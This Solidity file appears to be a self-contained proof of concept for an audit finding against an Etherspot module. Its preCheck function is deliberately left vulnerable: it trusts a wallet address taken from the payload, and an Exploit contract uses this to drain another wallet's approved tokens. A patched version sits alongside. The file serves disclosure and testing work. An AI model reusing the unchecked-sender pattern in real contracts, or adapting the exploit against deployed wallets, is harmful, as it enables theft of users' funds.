// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot CredibleAccountModule — preCheck does not bind the wallet
    argument to msg.sender (Shieldify, finding #61413 / H-03, July 2025).

    SYNTHETIC, cheatcode-free. Wallet B calls preCheck with wallet A's
    address in the payload. The module pulls N = 1000 GLUE from A to B.
    The fixed preCheck requires msg.sender == sender and reverts. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WalletA {
    function approve(Token token, address module, uint256 amount) external {
        token.approve(module, amount);
    }
}

contract CredibleAccountModule {
    Token public token;
    mapping(address => uint256) public locked;

    constructor(Token token_) {
        token = token_;
    }

    function preCheck(address, uint256, bytes calldata msgData) external returns (bytes memory hookData) {
        (address sender, uint256 amount) = abi.decode(msgData, (address, uint256));
        // @> VULN: sender is taken from the payload and is not checked against msg.sender
        token.transferFrom(sender, msg.sender, amount);
        locked[sender] += amount;
        hookData = abi.encode(sender, locked[sender]);
    }
}

contract CredibleAccountModuleFixed {
    Token public token;

    error WalletMismatch(address caller, address sender);

    constructor(Token token_) {
        token = token_;
    }

    function preCheck(address, uint256, bytes calldata msgData) external returns (bytes memory hookData) {
        (address sender, uint256 amount) = abi.decode(msgData, (address, uint256));
        if (msg.sender != sender) revert WalletMismatch(msg.sender, sender);
        token.transferFrom(sender, msg.sender, amount);
        hookData = abi.encode(sender, amount);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Token public token;
    WalletA public walletA;
    CredibleAccountModule public module;

    constructor() {
        token = new Token("Glue", "GLUE", 18);
        walletA = new WalletA();
        module = new CredibleAccountModule(token);
    }

    function run() external {
        token.mint(address(walletA), N);
        walletA.approve(token, address(module), N);
        bytes memory msgData = abi.encode(address(walletA), N);
        bytes memory hookData = module.preCheck(address(this), 0, msgData);
        (address sender, uint256 cumulative) = abi.decode(hookData, (address, uint256));
        require(sender == address(walletA), "payload wallet");
        require(address(this) != address(walletA), "caller is wallet B");
        require(cumulative == N, "A was charged N");
        require(token.balanceOf(address(this)) == N, "B received N");
        require(token.balanceOf(address(walletA)) == 0, "A still holds N");
    }
}
